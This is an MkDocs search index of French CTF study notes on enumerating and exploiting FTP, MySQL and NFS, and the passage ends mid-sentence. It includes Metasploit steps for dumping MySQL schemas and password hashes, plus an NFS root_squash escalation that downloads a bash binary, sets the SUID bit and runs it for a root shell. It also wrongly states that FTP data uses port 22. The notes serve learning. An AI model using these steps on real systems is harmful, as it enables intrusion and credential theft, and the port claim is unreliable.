{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"LAZIZAZOUZ Projet de documentation de mes connaissances en cyber avec Mkdocs","title":"LAZIZAZOUZ"},{"location":"#lazizazouz","text":"Projet de documentation de mes connaissances en cyber avec Mkdocs","title":"LAZIZAZOUZ"},{"location":"FTP_exploit_bases/","text":"Les bases des exploits FTP Introduction Le protocole de transfert de fichiers (FTP) est, comme son nom l'indique, un protocole utilis\u00e9 pour permettre le transfert de fichiers \u00e0 distance sur un r\u00e9seau. Le protocole FTP est un protocole client-serveur. Le client \u00e9tablit une connexion avec le serveur, ce dernier valide les informations d'identification fournies et ouvre la session. Une fois la session ouverte, le client peut envoyer des commandes FTP telles que LIST , RETR , STOR , etc. pour effectuer des op\u00e9rations sur les fichiers distants. Une session FTP typique utilise deux canaux : * un canal de commande (parfois appel\u00e9 canal de contr\u00f4le) * un canal de donn\u00e9es Cette s\u00e9paration des informations de commande et des donn\u00e9es dans des canaux distincts permet d'envoyer des commandes au serveur sans devoir attendre la fin du transfert de donn\u00e9es en cours. Si les deux canaux \u00e9taient interconnect\u00e9s, vous ne pourriez entrer des commandes qu'entre deux transferts de donn\u00e9es, ce qui ne serait pas efficace pour les transferts de fichiers volumineux ou les connexions internet lentes. Actif vs Passif Le serveur FTP peut prendre en charge les connexions actives ou passives, ou les deux. Dans une connexion FTP active, le client ouvre un port et \u00e9coute. Le serveur doit se connecter activement au client. Dans une connexion FTP passive, le serveur ouvre un port et \u00e9coute (passivement) et le client s'y connecte. Enumeration Ports de base FTP Le port de base FTP est le port 21 pour les commandes et 22 pour les transferts de donn\u00e9es. C'est du TCP/IP. Rep\u00e9rage des utilisateurs Certaines versions vuln\u00e9rables de in.ftpd et d'autres variantes de serveurs FTP renvoient des r\u00e9ponses diff\u00e9rentes \u00e0 la commande cwd pour les r\u00e9pertoires personnels qui existent et ceux qui n'existent pas. Cela peut \u00eatre exploit\u00e9 parce que vous pouvez lancer des commandes cwd avant l'authentification, et s'il y a un r\u00e9pertoire personnel, il y a plus que probablement un compte d'utilisateur pour l'accompagner. Bien que ce bogue soit principalement pr\u00e9sent dans les syst\u00e8mes anciens, il vaut la peine d'\u00eatre connu, car c'est un moyen d'exploiter le protocole FTP. Plus d'infos sur ce lien . Test de connexion anonyme On peut tester de se connecter en utilisant un nom d'utilisateur g\u00e9n\u00e9rique comme \"anonymous\" ou \"ftp\" avec un mot de passe vide. Si le serveur accepte la connexion, il est possible de t\u00e9l\u00e9charger des fichiers sans avoir \u00e0 s'authentifier. Cela peut \u00eatre utile pour t\u00e9l\u00e9charger des fichiers de configuration ou des fichiers de mot de passe. Pour se connecter en ftp il suffit de rentrer la commande suivante : ftp [IP]","title":"FTP"},{"location":"FTP_exploit_bases/#les-bases-des-exploits-ftp","text":"","title":"Les bases des exploits FTP"},{"location":"FTP_exploit_bases/#introduction","text":"Le protocole de transfert de fichiers (FTP) est, comme son nom l'indique, un protocole utilis\u00e9 pour permettre le transfert de fichiers \u00e0 distance sur un r\u00e9seau. Le protocole FTP est un protocole client-serveur. Le client \u00e9tablit une connexion avec le serveur, ce dernier valide les informations d'identification fournies et ouvre la session. Une fois la session ouverte, le client peut envoyer des commandes FTP telles que LIST , RETR , STOR , etc. pour effectuer des op\u00e9rations sur les fichiers distants. Une session FTP typique utilise deux canaux : * un canal de commande (parfois appel\u00e9 canal de contr\u00f4le) * un canal de donn\u00e9es Cette s\u00e9paration des informations de commande et des donn\u00e9es dans des canaux distincts permet d'envoyer des commandes au serveur sans devoir attendre la fin du transfert de donn\u00e9es en cours. Si les deux canaux \u00e9taient interconnect\u00e9s, vous ne pourriez entrer des commandes qu'entre deux transferts de donn\u00e9es, ce qui ne serait pas efficace pour les transferts de fichiers volumineux ou les connexions internet lentes.","title":"Introduction"},{"location":"FTP_exploit_bases/#actif-vs-passif","text":"Le serveur FTP peut prendre en charge les connexions actives ou passives, ou les deux. Dans une connexion FTP active, le client ouvre un port et \u00e9coute. Le serveur doit se connecter activement au client. Dans une connexion FTP passive, le serveur ouvre un port et \u00e9coute (passivement) et le client s'y connecte.","title":"Actif vs Passif"},{"location":"FTP_exploit_bases/#enumeration","text":"","title":"Enumeration"},{"location":"FTP_exploit_bases/#ports-de-base-ftp","text":"Le port de base FTP est le port 21 pour les commandes et 22 pour les transferts de donn\u00e9es. C'est du TCP/IP.","title":"Ports de base FTP"},{"location":"FTP_exploit_bases/#reperage-des-utilisateurs","text":"Certaines versions vuln\u00e9rables de in.ftpd et d'autres variantes de serveurs FTP renvoient des r\u00e9ponses diff\u00e9rentes \u00e0 la commande cwd pour les r\u00e9pertoires personnels qui existent et ceux qui n'existent pas. Cela peut \u00eatre exploit\u00e9 parce que vous pouvez lancer des commandes cwd avant l'authentification, et s'il y a un r\u00e9pertoire personnel, il y a plus que probablement un compte d'utilisateur pour l'accompagner. Bien que ce bogue soit principalement pr\u00e9sent dans les syst\u00e8mes anciens, il vaut la peine d'\u00eatre connu, car c'est un moyen d'exploiter le protocole FTP. Plus d'infos sur ce lien .","title":"Rep\u00e9rage des utilisateurs"},{"location":"FTP_exploit_bases/#test-de-connexion-anonyme","text":"On peut tester de se connecter en utilisant un nom d'utilisateur g\u00e9n\u00e9rique comme \"anonymous\" ou \"ftp\" avec un mot de passe vide. Si le serveur accepte la connexion, il est possible de t\u00e9l\u00e9charger des fichiers sans avoir \u00e0 s'authentifier. Cela peut \u00eatre utile pour t\u00e9l\u00e9charger des fichiers de configuration ou des fichiers de mot de passe. Pour se connecter en ftp il suffit de rentrer la commande suivante : ftp [IP]","title":"Test de connexion anonyme"},{"location":"MySQL_exploit_bases/","text":"Les bases de MySQL Introduction SQL (Structured Query Language) est un langage de requ\u00eate structur\u00e9 utilis\u00e9 pour communiquer avec une base de donn\u00e9es relationnelle. Il est utilis\u00e9 pour effectuer des op\u00e9rations sur les donn\u00e9es stock\u00e9es dans une base de donn\u00e9es ou pour modifier les donn\u00e9es existantes. Il est principalement utilis\u00e9 pour la gestion des donn\u00e9es dans les syst\u00e8mes de gestion de bases de donn\u00e9es relationnelles (SGBDR), tels que MySQL, Oracle, Sybase, Microsoft SQL Server, PostgreSQL et SQLite. Le serveur g\u00e8re toutes les instructions relatives \u00e0 la base de donn\u00e9es, telles que la cr\u00e9ation, l'\u00e9dition et l'acc\u00e8s aux donn\u00e9es. Il re\u00e7oit et g\u00e8re ces demandes et communique \u00e0 l'aide du protocole MySQL. L'ensemble du processus peut \u00eatre d\u00e9compos\u00e9 en plusieurs \u00e9tapes : MySQL cr\u00e9e une base de donn\u00e9es pour stocker et manipuler les donn\u00e9es, en d\u00e9finissant les relations entre chaque table. Les clients formulent des requ\u00eates en utilisant des instructions sp\u00e9cifiques en SQL. Le serveur r\u00e9pond au client en lui fournissant les informations demand\u00e9es MySQL peut fonctionner sur diff\u00e9rentes plateformes, qu'il s'agisse de Linux ou de Windows. Il est couramment utilis\u00e9 comme base de donn\u00e9es dorsale pour de nombreux sites web importants et constitue un composant essentiel de la pile LAMP, qui comprend : Linux, Apache, MySQL et PHP. Explication des mots cl\u00e9s MySQL Sch\u00e9ma Dans MySQL, physiquement, un sch\u00e9ma est synonyme de base de donn\u00e9es. Vous pouvez remplacer le mot-cl\u00e9 \"DATABASE\" par \"SCHEMA\" dans la syntaxe SQL de MySQL, par exemple en utilisant CREATE SCHEMA au lieu de CREATE DATABASE. Il est important de comprendre cette relation car d'autres produits de base de donn\u00e9es font une distinction. Par exemple, dans le produit Oracle Database, un sch\u00e9ma ne repr\u00e9sente qu'une partie d'une base de donn\u00e9es : les tables et autres objets appartenant \u00e0 un seul utilisateur. Les Hashs : Les hachages sont, tr\u00e8s simplement, le produit d'un algorithme cryptographique qui transforme une entr\u00e9e de longueur variable en une sortie de longueur fixe. Dans MySQL, les hachages peuvent \u00eatre utilis\u00e9s de diff\u00e9rentes mani\u00e8res, par exemple pour indexer des donn\u00e9es dans une table de hachage. Chaque hachage poss\u00e8de un identifiant unique qui sert de pointeur vers les donn\u00e9es d'origine. Cela permet de cr\u00e9er un index beaucoup plus petit que les donn\u00e9es d'origine, ce qui permet de rechercher et d'acc\u00e9der aux valeurs de mani\u00e8re plus efficace Cependant, les donn\u00e9es que nous allons extraire sont des hachages de mots de passe, qui sont simplement un moyen de stocker des mots de passe qui ne sont pas en clair. Enumeration Intro sur l'\u00e9num\u00e9ration MySQL MySQL n'est probablement pas le premier point d'appel lorsque vous obtenez des informations initiales sur le serveur. Vous pouvez, essayer de forcer les mots de passe des comptes par d\u00e9faut si vous n'avez vraiment pas d'autres informations ; cependant, dans la plupart des sc\u00e9narios CTF, il est peu probable que ce soit la voie que vous soyez cens\u00e9 suivre. En r\u00e8gle g\u00e9n\u00e9rale, vous aurez obtenu des informations d'identification initiales en \u00e9num\u00e9rant d'autres services, que vous pourrez ensuite utiliser pour \u00e9num\u00e9rer et exploiter le service MySQL. Ports de base SQL Le port de base SQL est le port 3306. C'est du TCP/IP. Packet n\u00e9cessaire Pour l'\u00e9num\u00e9ration de MySQL, il faut un client MySQL. Le plus l\u00e9g\u00e9 est mysql-client . Mais il existe aussi mysql-workbench qui est plus complet. Outils utilis\u00e9s pour l'\u00e9numation MySQL On va utiliser Metasploit pour l'\u00e9num\u00e9ration de MySQL. On va utiliser le module auxiliary/scanner/mysql/mysql_login . Mais il existe aussi des outils comme SQLMap , SQLNinja et SQLPing . Ou encore le script mysql-enum de nmap : scitp infos ou exploit db Connexion \u00e0 MySQL Pour se connecter \u00e0 MySQL, on utilise la commande suivante : mysql -u <user> -p <password> -h <host> -P <port> Utilisation de Metasploit Supposons qu'on ai r\u00e9cup\u00e9r\u00e9 le couple USER:PASSWORD, on va utiliser le module auxiliary/scanner/mysql/mysql_login de Metasploit. msf5 > use auxiliary/scanner/mysql/mysql_login msf5 auxiliary(scanner/mysql/mysql_login) > set RHOSTS RHOSTS => msf5 auxiliary(scanner/mysql/mysql_login) > set PASSWORD PASSWORD => msf5 auxiliary(scanner/mysql/mysql_login) > set USERNAME USERNAME => msf5 auxiliary(scanner/mysql/mysql_login) > run Par d\u00e9faut l'option SQL est select version() . Donc cela va nous retourner la version de MySQL. Mais on peut changer pour show databases pour afficher les bases de donn\u00e9es. Plus d'infos sur le module : ici Exploitation Dump des bases de donn\u00e9es Pour dump les bases de donn\u00e9es on va utiliser le module mysql_schemadump de Metasploit. msf5 > use auxiliary/scanner/mysql/mysql_schemadump msf5 auxiliary(scanner/mysql/mysql_schemadump) > set RHOSTS RHOSTS => msf5 auxiliary(scanner/mysql/mysql_schemadump) > set PASSWORD PASSWORD => msf5 auxiliary(scanner/mysql/mysql_schemadump) > set USERNAME USERNAME => msf5 auxiliary(scanner/mysql/mysql_schemadump) > run Dump des hashs des mots de passe Pour dump les hashs des mots de passe on va utiliser le module mysql_hashdump de Metasploit. msf5 > use auxiliary/scanner/mysql/mysql_hashdump msf5 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS ... msf5 auxiliary(scanner/mysql/mysql_hashdump) > run Dump des hashs des mots de passe sur sqlite manuellement Pour dump les hashs des mots de passe, supposons que l'on a acc\u00e8s au fichier '.db' qui n'est autre que la base de donn\u00e9e d'un site internet. Il suffit de la t\u00e9l\u00e9charger et de l'ouvrir avec un outil comme sqlite3 . Exemple : sqlite3 <database> On va afficher les tables : .tables On va afficher les informations sur les tables trouv\u00e9es : PRAGMA table_info(<nom de la table>); On va afficher les donn\u00e9es de la table : SELECT * FROM <nom de la table>;","title":"MySQL"},{"location":"MySQL_exploit_bases/#les-bases-de-mysql","text":"","title":"Les bases de MySQL"},{"location":"MySQL_exploit_bases/#introduction","text":"SQL (Structured Query Language) est un langage de requ\u00eate structur\u00e9 utilis\u00e9 pour communiquer avec une base de donn\u00e9es relationnelle. Il est utilis\u00e9 pour effectuer des op\u00e9rations sur les donn\u00e9es stock\u00e9es dans une base de donn\u00e9es ou pour modifier les donn\u00e9es existantes. Il est principalement utilis\u00e9 pour la gestion des donn\u00e9es dans les syst\u00e8mes de gestion de bases de donn\u00e9es relationnelles (SGBDR), tels que MySQL, Oracle, Sybase, Microsoft SQL Server, PostgreSQL et SQLite. Le serveur g\u00e8re toutes les instructions relatives \u00e0 la base de donn\u00e9es, telles que la cr\u00e9ation, l'\u00e9dition et l'acc\u00e8s aux donn\u00e9es. Il re\u00e7oit et g\u00e8re ces demandes et communique \u00e0 l'aide du protocole MySQL. L'ensemble du processus peut \u00eatre d\u00e9compos\u00e9 en plusieurs \u00e9tapes : MySQL cr\u00e9e une base de donn\u00e9es pour stocker et manipuler les donn\u00e9es, en d\u00e9finissant les relations entre chaque table. Les clients formulent des requ\u00eates en utilisant des instructions sp\u00e9cifiques en SQL. Le serveur r\u00e9pond au client en lui fournissant les informations demand\u00e9es MySQL peut fonctionner sur diff\u00e9rentes plateformes, qu'il s'agisse de Linux ou de Windows. Il est couramment utilis\u00e9 comme base de donn\u00e9es dorsale pour de nombreux sites web importants et constitue un composant essentiel de la pile LAMP, qui comprend : Linux, Apache, MySQL et PHP.","title":"Introduction"},{"location":"MySQL_exploit_bases/#explication-des-mots-cles-mysql","text":"","title":"Explication des mots cl\u00e9s MySQL"},{"location":"MySQL_exploit_bases/#schema","text":"Dans MySQL, physiquement, un sch\u00e9ma est synonyme de base de donn\u00e9es. Vous pouvez remplacer le mot-cl\u00e9 \"DATABASE\" par \"SCHEMA\" dans la syntaxe SQL de MySQL, par exemple en utilisant CREATE SCHEMA au lieu de CREATE DATABASE. Il est important de comprendre cette relation car d'autres produits de base de donn\u00e9es font une distinction. Par exemple, dans le produit Oracle Database, un sch\u00e9ma ne repr\u00e9sente qu'une partie d'une base de donn\u00e9es : les tables et autres objets appartenant \u00e0 un seul utilisateur.","title":"Sch\u00e9ma"},{"location":"MySQL_exploit_bases/#les-hashs","text":"Les hachages sont, tr\u00e8s simplement, le produit d'un algorithme cryptographique qui transforme une entr\u00e9e de longueur variable en une sortie de longueur fixe. Dans MySQL, les hachages peuvent \u00eatre utilis\u00e9s de diff\u00e9rentes mani\u00e8res, par exemple pour indexer des donn\u00e9es dans une table de hachage. Chaque hachage poss\u00e8de un identifiant unique qui sert de pointeur vers les donn\u00e9es d'origine. Cela permet de cr\u00e9er un index beaucoup plus petit que les donn\u00e9es d'origine, ce qui permet de rechercher et d'acc\u00e9der aux valeurs de mani\u00e8re plus efficace Cependant, les donn\u00e9es que nous allons extraire sont des hachages de mots de passe, qui sont simplement un moyen de stocker des mots de passe qui ne sont pas en clair.","title":"Les Hashs :"},{"location":"MySQL_exploit_bases/#enumeration","text":"","title":"Enumeration"},{"location":"MySQL_exploit_bases/#intro-sur-lenumeration-mysql","text":"MySQL n'est probablement pas le premier point d'appel lorsque vous obtenez des informations initiales sur le serveur. Vous pouvez, essayer de forcer les mots de passe des comptes par d\u00e9faut si vous n'avez vraiment pas d'autres informations ; cependant, dans la plupart des sc\u00e9narios CTF, il est peu probable que ce soit la voie que vous soyez cens\u00e9 suivre. En r\u00e8gle g\u00e9n\u00e9rale, vous aurez obtenu des informations d'identification initiales en \u00e9num\u00e9rant d'autres services, que vous pourrez ensuite utiliser pour \u00e9num\u00e9rer et exploiter le service MySQL.","title":"Intro sur l'\u00e9num\u00e9ration MySQL"},{"location":"MySQL_exploit_bases/#ports-de-base-sql","text":"Le port de base SQL est le port 3306. C'est du TCP/IP.","title":"Ports de base SQL"},{"location":"MySQL_exploit_bases/#packet-necessaire","text":"Pour l'\u00e9num\u00e9ration de MySQL, il faut un client MySQL. Le plus l\u00e9g\u00e9 est mysql-client . Mais il existe aussi mysql-workbench qui est plus complet.","title":"Packet n\u00e9cessaire"},{"location":"MySQL_exploit_bases/#outils-utilises-pour-lenumation-mysql","text":"On va utiliser Metasploit pour l'\u00e9num\u00e9ration de MySQL. On va utiliser le module auxiliary/scanner/mysql/mysql_login . Mais il existe aussi des outils comme SQLMap , SQLNinja et SQLPing . Ou encore le script mysql-enum de nmap : scitp infos ou exploit db","title":"Outils utilis\u00e9s pour l'\u00e9numation MySQL"},{"location":"MySQL_exploit_bases/#connexion-a-mysql","text":"Pour se connecter \u00e0 MySQL, on utilise la commande suivante : mysql -u <user> -p <password> -h <host> -P <port>","title":"Connexion \u00e0 MySQL"},{"location":"MySQL_exploit_bases/#utilisation-de-metasploit","text":"Supposons qu'on ai r\u00e9cup\u00e9r\u00e9 le couple USER:PASSWORD, on va utiliser le module auxiliary/scanner/mysql/mysql_login de Metasploit. msf5 > use auxiliary/scanner/mysql/mysql_login msf5 auxiliary(scanner/mysql/mysql_login) > set RHOSTS RHOSTS => msf5 auxiliary(scanner/mysql/mysql_login) > set PASSWORD PASSWORD => msf5 auxiliary(scanner/mysql/mysql_login) > set USERNAME USERNAME => msf5 auxiliary(scanner/mysql/mysql_login) > run Par d\u00e9faut l'option SQL est select version() . Donc cela va nous retourner la version de MySQL. Mais on peut changer pour show databases pour afficher les bases de donn\u00e9es. Plus d'infos sur le module : ici","title":"Utilisation de Metasploit"},{"location":"MySQL_exploit_bases/#exploitation","text":"","title":"Exploitation"},{"location":"MySQL_exploit_bases/#dump-des-bases-de-donnees","text":"Pour dump les bases de donn\u00e9es on va utiliser le module mysql_schemadump de Metasploit. msf5 > use auxiliary/scanner/mysql/mysql_schemadump msf5 auxiliary(scanner/mysql/mysql_schemadump) > set RHOSTS RHOSTS => msf5 auxiliary(scanner/mysql/mysql_schemadump) > set PASSWORD PASSWORD => msf5 auxiliary(scanner/mysql/mysql_schemadump) > set USERNAME USERNAME => msf5 auxiliary(scanner/mysql/mysql_schemadump) > run","title":"Dump des bases de donn\u00e9es"},{"location":"MySQL_exploit_bases/#dump-des-hashs-des-mots-de-passe","text":"Pour dump les hashs des mots de passe on va utiliser le module mysql_hashdump de Metasploit. msf5 > use auxiliary/scanner/mysql/mysql_hashdump msf5 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS ... msf5 auxiliary(scanner/mysql/mysql_hashdump) > run","title":"Dump des hashs des mots de passe"},{"location":"MySQL_exploit_bases/#dump-des-hashs-des-mots-de-passe-sur-sqlite-manuellement","text":"Pour dump les hashs des mots de passe, supposons que l'on a acc\u00e8s au fichier '.db' qui n'est autre que la base de donn\u00e9e d'un site internet. Il suffit de la t\u00e9l\u00e9charger et de l'ouvrir avec un outil comme sqlite3 . Exemple : sqlite3 <database> On va afficher les tables : .tables On va afficher les informations sur les tables trouv\u00e9es : PRAGMA table_info(<nom de la table>); On va afficher les donn\u00e9es de la table : SELECT * FROM <nom de la table>;","title":"Dump des hashs des mots de passe sur sqlite manuellement"},{"location":"NFS_exploit_bases/","text":"Les bases des exploits NFS Introduction Le protocole NFS (Network File System) est un protocole de partage de fichiers qui permet aux utilisateurs de se connecter \u00e0 un serveur et d'acc\u00e9der \u00e0 des fichiers distants comme s'ils \u00e9taient stock\u00e9s localement. Il est utilis\u00e9 pour partager des fichiers, des r\u00e9pertoires et des p\u00e9riph\u00e9riques sur un r\u00e9seau. Il est bas\u00e9 sur le protocole RPC (Remote Procedure Call) et utilise le protocole TCP/IP pour la communication entre les machines. Il permet \u00e0 un syst\u00e8me de partager des r\u00e9pertoires et des fichiers avec d'autres sur un r\u00e9seau. En utilisant NFS, les utilisateurs et les programmes peuvent acc\u00e9der \u00e0 des fichiers sur des syst\u00e8mes distants presque comme s'il s'agissait de fichiers locaux. Pour ce faire, il monte tout ou partie d'un syst\u00e8me de fichiers sur un serveur. Les clients peuvent acc\u00e9der \u00e0 la partie du syst\u00e8me de fichiers qui est mont\u00e9e avec les privil\u00e8ges attribu\u00e9s \u00e0 chaque fichier. Le protocole NFS permet de transf\u00e9rer des fichiers entre des ordinateurs fonctionnant sous Windows et d'autres syst\u00e8mes d'exploitation non Windows, tels que Linux, MacOS ou UNIX. Un ordinateur fonctionnant sous Windows Server peut faire office de serveur de fichiers NFS pour d'autres ordinateurs clients ne fonctionnant pas sous Windows. De m\u00eame, NFS permet \u00e0 un ordinateur Windows fonctionnant sous Windows Server d'acc\u00e9der \u00e0 des fichiers stock\u00e9s sur un serveur NFS non Windows. Fonctionnement succinct du protocole NFS Tout d'abord, le client demande \u00e0 monter un r\u00e9pertoire d'un h\u00f4te distant sur un r\u00e9pertoire local, de la m\u00eame mani\u00e8re qu'il peut monter un p\u00e9riph\u00e9rique physique. Le service de montage se connecte alors au d\u00e9mon de montage correspondant \u00e0 l'aide de RPC. Le serveur v\u00e9rifie si l'utilisateur a le droit de monter le r\u00e9pertoire demand\u00e9. Il renvoie ensuite une poign\u00e9e de fichier qui identifie de mani\u00e8re unique chaque fichier et r\u00e9pertoire se trouvant sur le serveur. Si quelqu'un souhaite acc\u00e9der \u00e0 un fichier \u00e0 l'aide de NFS, un appel RPC est lanc\u00e9 \u00e0 NFSD (le d\u00e9mon NFS) sur le serveur. Cet appel prend des param\u00e8tres tels que : l'identifiant du fichier le nom du fichier auquel il faut acc\u00e9der l'ID de l'utilisateur l'ID du groupe de l'utilisateur Ces \u00e9l\u00e9ments sont utilis\u00e9s pour d\u00e9terminer les droits d'acc\u00e8s au fichier sp\u00e9cifi\u00e9. C'est ce qui contr\u00f4le les autorisations de l'utilisateur, c'est-\u00e0-dire la lecture et l'\u00e9criture des fichiers. Enumeration Packet n\u00e9cessaire Tout d'abord, il faut avoir le paquet nfs-common install\u00e9 sur la machine. Pour cela, il suffit de rentrer la commande suivante : sudo apt install nfs-common Ports de base NFS Le port de base NFS est le port 2049. C'est du TCP/IP. Enum\u00e9ration des partages NFS Pour lister les partages NFS, il suffit de rentrer la commande suivante : showmount -e [IP] Montage d'un partage NFS Le client a besoin d'un point de montage local pour acc\u00e9der au syst\u00e8me de fichiers NFS partag\u00e9. Le point de montage peut \u00eatre un r\u00e9pertoire vide ou un r\u00e9pertoire existant avec des fichiers. Le client peut monter le syst\u00e8me de fichiers NFS partag\u00e9 sur un point de montage local \u00e0 l'aide de la commande mount. sudo mount -t nfs [IP]:[PATH] [PATH] -nolock TAG Description -t nfs sp\u00e9cifie le type de syst\u00e8me de fichiers [IP]:[PATH] sp\u00e9cifie l'adresse IP du serveur NFS et le chemin d'acc\u00e8s au partage NFS [PATH] sp\u00e9cifie le chemin d'acc\u00e8s au point de montage local -nolock Sp\u00e9cifie de ne pas utiliser le verrouillage NLM D\u00e9montage d'un partage NFS Pour d\u00e9monter un partage NFS, il suffit de rentrer la commande suivante : sudo umount [PATH] Exploitation d'un partage NFS Gains de privil\u00e8ges Exploitation de l'UID Pr\u00e9requis : avoir r\u00e9ussi \u00e0 se connecter en SSH sur la machine cible Si le serveur NFS est configur\u00e9 pour utiliser des UID statiques, il est possible de cr\u00e9er un utilisateur avec un UID bas et de se connecter en tant que cet utilisateur pour obtenir des privil\u00e8ges plus \u00e9lev\u00e9s. M\u00e9thode : Se connecter en tant qu'utilisateur avec un UID bas T\u00e9l\u00e9chargement de l'ex\u00e9cutable Bash sur le partage NFS D\u00e9finir les permissions SUID via NFS en raison d'une mauvaise configuration de la racine Squash Connexion par SSH Ex\u00e9cuter l'ex\u00e9cutable SUID Bit Bash ROOT ACCESS La cible \u00e9tant un serveur Ubuntu Server 18.04 nous utiliserons un ex\u00e9cutable bash standard d'Ubuntu, le m\u00eame que celui du serveur (le type de serveur a \u00e9t\u00e9 su gr\u00e2ce \u00e0 notre analyse nmap). Lex\u00e9cutable est disponible sur ce github Attention \u00e0 ne t\u00e9l\u00e9charger que l'ex\u00e9cutable voulu : bash L'ex\u00e9cutable : wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash Il faut changer les permission de l'ex\u00e9cutable en lui rajoutant le bit SUID : chmod +s bash Il faut aussi lui ajouter les droits d'ex\u00e9cution s'il ne l'a pas : chmod +x bash Les droits du fichier devraient ressembler \u00e0 \u00e7a : -rwsr-sr-x 1 root root 1.3M Apr 4 2018 bash Il faut le mettre dans le r\u00e9pertoire mont\u00e9 en nfs et se connecter en SSH sur la machine cible. Enfin, il suffit de l'ex\u00e9cuter avec : ./bash -p Le flag -p permet de garder les droits de l'utilisateur actuel, ce qui permet d'obtenir un shell root.","title":"NFS"},{"location":"NFS_exploit_bases/#les-bases-des-exploits-nfs","text":"","title":"Les bases des exploits NFS"},{"location":"NFS_exploit_bases/#introduction","text":"Le protocole NFS (Network File System) est un protocole de partage de fichiers qui permet aux utilisateurs de se connecter \u00e0 un serveur et d'acc\u00e9der \u00e0 des fichiers distants comme s'ils \u00e9taient stock\u00e9s localement. Il est utilis\u00e9 pour partager des fichiers, des r\u00e9pertoires et des p\u00e9riph\u00e9riques sur un r\u00e9seau. Il est bas\u00e9 sur le protocole RPC (Remote Procedure Call) et utilise le protocole TCP/IP pour la communication entre les machines. Il permet \u00e0 un syst\u00e8me de partager des r\u00e9pertoires et des fichiers avec d'autres sur un r\u00e9seau. En utilisant NFS, les utilisateurs et les programmes peuvent acc\u00e9der \u00e0 des fichiers sur des syst\u00e8mes distants presque comme s'il s'agissait de fichiers locaux. Pour ce faire, il monte tout ou partie d'un syst\u00e8me de fichiers sur un serveur. Les clients peuvent acc\u00e9der \u00e0 la partie du syst\u00e8me de fichiers qui est mont\u00e9e avec les privil\u00e8ges attribu\u00e9s \u00e0 chaque fichier. Le protocole NFS permet de transf\u00e9rer des fichiers entre des ordinateurs fonctionnant sous Windows et d'autres syst\u00e8mes d'exploitation non Windows, tels que Linux, MacOS ou UNIX. Un ordinateur fonctionnant sous Windows Server peut faire office de serveur de fichiers NFS pour d'autres ordinateurs clients ne fonctionnant pas sous Windows. De m\u00eame, NFS permet \u00e0 un ordinateur Windows fonctionnant sous Windows Server d'acc\u00e9der \u00e0 des fichiers stock\u00e9s sur un serveur NFS non Windows.","title":"Introduction"},{"location":"NFS_exploit_bases/#fonctionnement-succinct-du-protocole-nfs","text":"Tout d'abord, le client demande \u00e0 monter un r\u00e9pertoire d'un h\u00f4te distant sur un r\u00e9pertoire local, de la m\u00eame mani\u00e8re qu'il peut monter un p\u00e9riph\u00e9rique physique. Le service de montage se connecte alors au d\u00e9mon de montage correspondant \u00e0 l'aide de RPC. Le serveur v\u00e9rifie si l'utilisateur a le droit de monter le r\u00e9pertoire demand\u00e9. Il renvoie ensuite une poign\u00e9e de fichier qui identifie de mani\u00e8re unique chaque fichier et r\u00e9pertoire se trouvant sur le serveur. Si quelqu'un souhaite acc\u00e9der \u00e0 un fichier \u00e0 l'aide de NFS, un appel RPC est lanc\u00e9 \u00e0 NFSD (le d\u00e9mon NFS) sur le serveur. Cet appel prend des param\u00e8tres tels que : l'identifiant du fichier le nom du fichier auquel il faut acc\u00e9der l'ID de l'utilisateur l'ID du groupe de l'utilisateur Ces \u00e9l\u00e9ments sont utilis\u00e9s pour d\u00e9terminer les droits d'acc\u00e8s au fichier sp\u00e9cifi\u00e9. C'est ce qui contr\u00f4le les autorisations de l'utilisateur, c'est-\u00e0-dire la lecture et l'\u00e9criture des fichiers.","title":"Fonctionnement succinct du protocole NFS"},{"location":"NFS_exploit_bases/#enumeration","text":"","title":"Enumeration"},{"location":"NFS_exploit_bases/#packet-necessaire","text":"Tout d'abord, il faut avoir le paquet nfs-common install\u00e9 sur la machine. Pour cela, il suffit de rentrer la commande suivante : sudo apt install nfs-common","title":"Packet n\u00e9cessaire"},{"location":"NFS_exploit_bases/#ports-de-base-nfs","text":"Le port de base NFS est le port 2049. C'est du TCP/IP.","title":"Ports de base NFS"},{"location":"NFS_exploit_bases/#enumeration-des-partages-nfs","text":"Pour lister les partages NFS, il suffit de rentrer la commande suivante : showmount -e [IP]","title":"Enum\u00e9ration des partages NFS"},{"location":"NFS_exploit_bases/#montage-dun-partage-nfs","text":"Le client a besoin d'un point de montage local pour acc\u00e9der au syst\u00e8me de fichiers NFS partag\u00e9. Le point de montage peut \u00eatre un r\u00e9pertoire vide ou un r\u00e9pertoire existant avec des fichiers. Le client peut monter le syst\u00e8me de fichiers NFS partag\u00e9 sur un point de montage local \u00e0 l'aide de la commande mount. sudo mount -t nfs [IP]:[PATH] [PATH] -nolock TAG Description -t nfs sp\u00e9cifie le type de syst\u00e8me de fichiers [IP]:[PATH] sp\u00e9cifie l'adresse IP du serveur NFS et le chemin d'acc\u00e8s au partage NFS [PATH] sp\u00e9cifie le chemin d'acc\u00e8s au point de montage local -nolock Sp\u00e9cifie de ne pas utiliser le verrouillage NLM","title":"Montage d'un partage NFS"},{"location":"NFS_exploit_bases/#demontage-dun-partage-nfs","text":"Pour d\u00e9monter un partage NFS, il suffit de rentrer la commande suivante : sudo umount [PATH]","title":"D\u00e9montage d'un partage NFS"},{"location":"NFS_exploit_bases/#exploitation-dun-partage-nfs","text":"","title":"Exploitation d'un partage NFS"},{"location":"NFS_exploit_bases/#gains-de-privileges","text":"","title":"Gains de privil\u00e8ges"},{"location":"NFS_exploit_bases/#exploitation-de-luid","text":"Pr\u00e9requis : avoir r\u00e9ussi \u00e0 se connecter en SSH sur la machine cible Si le serveur NFS est configur\u00e9 pour utiliser des UID statiques, il est possible de cr\u00e9er un utilisateur avec un UID bas et de se connecter en tant que cet utilisateur pour obtenir des privil\u00e8ges plus \u00e9lev\u00e9s. M\u00e9thode : Se connecter en tant qu'utilisateur avec un UID bas T\u00e9l\u00e9chargement de l'ex\u00e9cutable Bash sur le partage NFS D\u00e9finir les permissions SUID via NFS en raison d'une mauvaise configuration de la racine Squash Connexion par SSH Ex\u00e9cuter l'ex\u00e9cutable SUID Bit Bash ROOT ACCESS La cible \u00e9tant un serveur Ubuntu Server 18.04 nous utiliserons un ex\u00e9cutable bash standard d'Ubuntu, le m\u00eame que celui du serveur (le type de serveur a \u00e9t\u00e9 su gr\u00e2ce \u00e0 notre analyse 